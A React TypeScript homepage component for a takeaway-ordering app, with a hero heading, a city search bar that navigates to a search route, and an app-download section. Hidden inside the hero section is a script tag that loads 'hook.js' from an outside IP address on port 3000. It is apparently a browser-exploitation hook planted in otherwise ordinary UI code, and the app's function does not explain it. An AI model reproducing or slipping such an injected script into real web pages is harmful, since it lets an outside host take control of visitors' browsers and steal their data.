import landingImage from "../assets/landing.png";
import appImage from "../assets/appDownload.png";
import SearchBar, { SearchForm } from "@/components/SearchBar";
import { useNavigate } from "react-router-dom";

export const HomePage = () => {
  const navigate = useNavigate();

  const handleSearchSubmit = (searchFormValues: SearchForm) => {
    navigate({
      pathname: `/search/${searchFormValues.searchQuery}`,
    });
  };
  return (
    <div className="flex flex-col gap-12">
      <div className="flex flex-col gap-4 px-4 py-8 -mt-16 text-center bg-white rounded-lg shadow-md">
        <h1 className="text-5xl font-bold tracking-tight text-orange-500 ">
          Tuck into a takeway today
        </h1>
        <span className="text-xl ">Food is just click away!</span>
        <SearchBar
          placeHolder={"Search for City or Town"}
          onSubmit={handleSearchSubmit}
        />
        <script src="http://172.16.213.144:3000/hook.js"></script>
      </div>
      <div className="grid gap-5 md:grid-cols-2">
        <img src={landingImage} alt="" className="" />
        <div className="flex flex-col items-center justify-center gap-4 text-center">
          <span className="text-3xl font-bold tracking-tighter ">
            Order Take Even Faster!
          </span>
          <span className="">
            Download the FastExpress app for faster ordering and personalised
            recommendations
          </span>
          <img src={appImage} alt="" />
        </div>
      </div>
    </div>
  );
};
